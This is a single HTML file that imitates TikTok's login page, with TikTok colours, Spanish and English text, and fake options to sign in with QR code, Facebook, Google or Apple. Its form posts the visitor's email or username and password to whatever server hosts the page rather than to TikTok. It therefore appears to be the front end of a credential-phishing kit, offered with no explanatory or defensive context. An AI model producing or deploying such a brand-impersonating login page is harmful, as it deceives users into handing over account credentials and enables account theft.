<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Iniciar sesión</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 100%;
            max-width: 480px;
            padding: 20px;
            text-align: center;
        }
        h2 {
            font-size: 24px;
            font-weight: 700;
            color: #161823;
            margin-bottom: 12px;
        }
        .desc {
            font-size: 14px;
            color: #8a8b91;
            margin-bottom: 24px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid #e1e1e2;
            background: #f1f1f2;
            color: #161823;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #fe2c55;
            background: #fff;
        }
        input::placeholder { color: #8a8b91; }
        button[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #fe2c55;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        .forgot-link {
            display: block;
            margin-top: 16px;
            color: #fe2c55;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8a8b91;
            font-size: 12px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #e1e1e2;
        }
        .divider span { padding: 0 10px; }
        .login-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .login-option {
            display: flex;
            align-items: center;
            gap: 12px;
            border: 1px solid #e1e1e2;
            border-radius: 8px;
            padding: 12px 16px;
            cursor: pointer;
            background: #fff;
            text-align: left;
        }
        .login-option svg {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
        }
        .login-option-text {
            font-size: 15px;
            color: #161823;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Log in to TikTok</h2>
        <p class="desc">Manage your account, check notifications, comment on videos, and more.</p>

        <form method="post">
            <input type="text" name="email" placeholder="Correo electrónico, usuario o teléfono" required>
            <input type="password" name="pass" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>

        <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>

        <div class="divider"><span>o continúa con</span></div>

        <div class="login-options">
            <div class="login-option">
                <!-- Icono QR -->
                <svg viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M8 6C6.89543 6 6 6.89543 6 8V21C6 22.1046 6.89543 23 8 23H21C22.1046 23 23 22.1046 23 21V8C23 6.89543 22.1046 6 21 6H8ZM10 19V10H19V19H10ZM28 6C26.8954 6 26 6.89543 26 8V21C26 22.1046 26.8954 23 28 23H41C42.1046 23 43 22.1046 43 21V8C43 6.89543 42.1046 6 41 6H28ZM30 19V10H39V19H30ZM8 26C6.89543 26 6 26.8954 6 28V41C6 42.1046 6.89543 43 8 43H21C22.1046 43 23 42.1046 23 41V28C23 26.8954 22.1046 26 21 26H8ZM10 39V30H19V39H10ZM26 42C26 42.5523 26.4477 43 27 43H29C29.5523 43 30 42.5523 30 42V27C30 26.4477 29.5523 26 29 26H27C26.4477 26 26 26.4477 26 27V42ZM32.5 42C32.5 42.5523 32.9477 43 33.5 43H35.5C36.0523 43 36.5 42.5523 36.5 42V27C36.5 26.4477 36.0523 26 35.5 26H33.5C32.9477 26 32.5 26.4477 32.5 27V42ZM40 43C39.4477 43 39 42.5523 39 42V27C39 26.4477 39.4477 26 40 26H42C42.5523 26 43 26.4477 43 27V42C43 42.5523 42.5523 43 42 43H40Z"/></svg>
                <span class="login-option-text">Use QR code</span>
            </div>
            <div class="login-option">
                <!-- Icono usuario -->
                <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M24 3a10 10 0 1 0 0 20 10 10 0 0 0 0-20Zm0 23C13.06 26 7 33.92 7 40.44 7 44 9 44 16 44h16c7 0 9 0 9-3.56C41 33.92 34.94 26 24 26Z"/></svg>
                <span class="login-option-text">Use phone / email / username</span>
            </div>
            <div class="login-option">
                <!-- Icono Facebook -->
                <svg fill="none" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M24 47C36.7025 47 47 36.7025 47 24C47 11.2975 36.7025 1 24 1C11.2975 1 1 11.2975 1 24C1 36.7025 11.2975 47 24 47Z" fill="white"/><path d="M24 1C11.2964 1 1 11.2964 1 24C1 35.4775 9.40298 44.9804 20.3846 46.7205L20.3936 30.6629H14.5151V24.009H20.3936C20.3936 24.009 20.3665 20.2223 20.3936 18.5363C20.4206 16.8503 20.7542 15.2274 21.6288 13.7487C22.9722 11.4586 25.0639 10.3407 27.6335 10.0251C29.7432 9.76362 31.826 10.0521 33.9087 10.3407C34.0529 10.3587 34.125 10.3767 34.2693 10.4038C34.2693 10.4038 34.2783 10.6472 34.2693 10.8005C34.2603 12.4053 34.2693 16.0839 34.2693 16.0839C33.2685 16.0659 31.6096 15.9667 30.5096 16.138C28.6884 16.4175 27.6425 17.5806 27.6064 19.4108C27.5704 20.8354 27.5884 24.009 27.5884 24.009H33.9988L32.962 30.6629H27.5974V46.7205C38.597 44.9984 47.009 35.4775 47.009 24C47 11.2964 36.7036 1 24 1Z" fill="#0075FA"/></svg>
                <span class="login-option-text">Continue with Facebook</span>
            </div>
            <div class="login-option">
                <!-- Icono Google -->
                <svg fill="none" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M43 24.4313C43 23.084 42.8767 21.7885 42.6475 20.5449H24.3877V27.8945H34.8219C34.3724 30.2695 33.0065 32.2818 30.9532 33.6291V38.3964H37.2189C40.885 35.0886 43 30.2177 43 24.4313Z" fill="#4285F4"/><path fill-rule="evenodd" clip-rule="evenodd" d="M24.3872 43.001C29.6219 43.001 34.0107 41.2996 37.2184 38.3978L30.9527 33.6305C29.2165 34.7705 26.9958 35.4441 24.3872 35.4441C19.3375 35.4441 15.0633 32.1018 13.5388 27.6108H7.06152V32.5337C10.2517 38.7433 16.8082 43.001 24.3872 43.001Z" fill="#34A853"/><path fill-rule="evenodd" clip-rule="evenodd" d="M13.5395 27.6094C13.1516 26.4695 12.9313 25.2517 12.9313 23.9994C12.9313 22.7472 13.1516 21.5295 13.5395 20.3894V15.4668H7.06217C5.74911 18.0318 5 20.9336 5 23.9994C5 27.0654 5.74911 29.9673 7.06217 32.5323L13.5395 27.6094Z" fill="#FBBC04"/><path fill-rule="evenodd" clip-rule="evenodd" d="M24.3872 12.5568C27.2336 12.5568 29.7894 13.5155 31.7987 15.3982L37.3595 9.94866C34.0018 6.88281 29.6131 5 24.3872 5C16.8082 5 10.2517 9.25777 7.06152 15.4674L13.5388 20.39C15.0633 15.8991 19.3375 12.5568 24.3872 12.5568Z" fill="#EA4335"/></svg>
                <span class="login-option-text">Continue with Google</span>
            </div>
            <div class="login-option">
                <!-- Icono Apple -->
                <svg fill="none" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M32.5395 4C32.818 6.36773 31.8105 8.69873 30.3367 10.4125C28.7997 12.0988 26.3381 13.3901 23.9417 13.223C23.6296 10.9471 24.8426 8.52606 26.2018 7.04921C27.7388 5.37215 30.4058 4.08817 32.5395 4ZM40.3837 17.6472C40.1083 17.8003 35.6843 20.2608 35.7333 25.2724C35.7886 31.3304 41.4309 33.3307 41.5 33.3528C41.4664 33.4924 40.6169 36.2422 38.5011 39.0324C36.7329 41.4901 34.8798 43.8928 31.9402 43.9368C30.5423 43.9665 29.5985 43.5924 28.6151 43.2026C27.5889 42.7957 26.5195 42.3718 24.8459 42.3718C23.0723 42.3718 21.9556 42.8092 20.8786 43.2311C19.9474 43.5958 19.0459 43.9489 17.7752 43.9975C14.9739 44.0948 12.8343 41.3744 11.003 38.9387C7.34418 33.9681 4.49342 24.9289 8.31419 18.779C10.1653 15.7628 13.5436 13.8194 17.151 13.768C18.7401 13.7368 20.2645 14.3064 21.6007 14.8057C22.6216 15.1873 23.5327 15.5277 24.2789 15.5277C24.9355 15.5277 25.822 15.2004 26.8551 14.819C28.4827 14.218 30.4741 13.4828 32.5032 13.6817C33.8901 13.7184 37.8412 14.1905 40.3897 17.6438L40.3837 17.6472Z" fill="#161823"/></svg>
                <span class="login-option-text">Continue with Apple</span>
            </div>
        </div>
    </div>
</body>
</html>
